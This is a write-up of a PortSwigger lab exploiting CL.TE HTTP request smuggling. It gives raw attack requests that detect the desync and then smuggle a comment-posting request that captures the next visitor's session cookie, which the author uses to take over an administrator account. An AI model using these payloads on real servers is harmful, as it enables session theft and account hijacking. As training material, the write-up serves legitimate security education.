# Exploiting HTTP request smuggling to capture other users' requests

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests), you'll learn: Exploiting HTTP request smuggling to capture other users' requests! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server that causes the next user's request to be stored in the application. Then retrieve the next user's request and use the victim user's cookies to access their account.

> Note: The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-9/images/Pasted%20image%2020230201184511.png)

In here, we can test for HTTP request smuggling.

But, we need to determind which type of header does the front-end and back-end server uses.

- CL.TE:

First, we can test CL.TE (Front-end uses `Content-Length` header, back-end uses `Transfer-Encoding` header).

To do so, we need to sent an attack request, then a normal request.

**Attack request:**
```http
POST / HTTP/1.1
Host: 0a0b009503762decc15371be0099007c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Transfer-Encoding: chunked

0

GET /404pls HTTP/1.1
X-Foo: x
```

This request will smuggle a 404 page GET request.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-9/images/Pasted%20image%2020230201184911.png)

**Normal request:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-9/images/Pasted%20image%2020230201184925.png)

As you can see, our normal request has been overrided by our attack smuggled request.

Hence, the web application is **vulnerable to CL.TE HTTP request smuggling.**

In the lab's background, our goal is to **smuggle a request to the back-end server that causes the next user's request to be stored in the application. Then retrieve the next user's request and use the victim user's cookies to access their account.**

**In the home page, we can view other posts:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-9/images/Pasted%20image%2020230201185122.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-9/images/Pasted%20image%2020230201185137.png)

And we can leave some comments.

Let's leave a test comment:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-9/images/Pasted%20image%2020230201185219.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-9/images/Pasted%20image%2020230201185232.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-9/images/Pasted%20image%2020230201185246.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-9/images/Pasted%20image%2020230201185314.png)

When we clicked the "Post Comment", **it'll send a POST request to `/post/comment`, with parameter `csrf`, `postId`, `comment`, `name`, `email`, `website`.**

Also, the `name` and `comment` value is being **reflected** to the post page.

**Armed with above information, we can smuggle a request to the back-end server that causes the next user's request to be stored in the application:**
```http
POST / HTTP/1.1
Host: 0a0b009503762decc15371be0099007c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 260
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Cookie: session=ix1mM13Nfy3blSXvkpeuSx2VQC8eANjo
Content-Type: application/x-www-form-urlencoded
Content-Length: 793

csrf=dzIBnytJENliX4HnUuoeIn1UbW3Yh2PJ&postId=1&name=smuggled&email=user%40smuggled.com&website=&comment=
```

> Note: The `comment` parameter must be at the last parameter. Also, you need to include your session cookie, otherwise the CSRF token is invalid.

The `Content-Length` header of the smuggled request indicates that the body will be 793 bytes long, but we've only sent 104 bytes. In this case, the back-end server will wait for the remaining 689 bytes before issuing the response, or else issue a timeout if this doesn't arrive quick enough. As a result, when another request is sent to the back-end server down the same connection, the first 689 are effectively appended to the smuggled request.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-9/images/Pasted%20image%2020230201191605.png)

> Note: The attack request need to be sent three times in order to retrieve the next user's request.

**Then, refresh the page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-9/images/Pasted%20image%2020230201191707.png)

Nice! We successfully retrieved the next user's session cookie!

**Let's hijack that user's account via editing the session cookie:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-9/images/Pasted%20image%2020230201191808.png)

I'm user `administrator`!

# What we've learned:

1. Exploiting HTTP request smuggling to capture other users' requests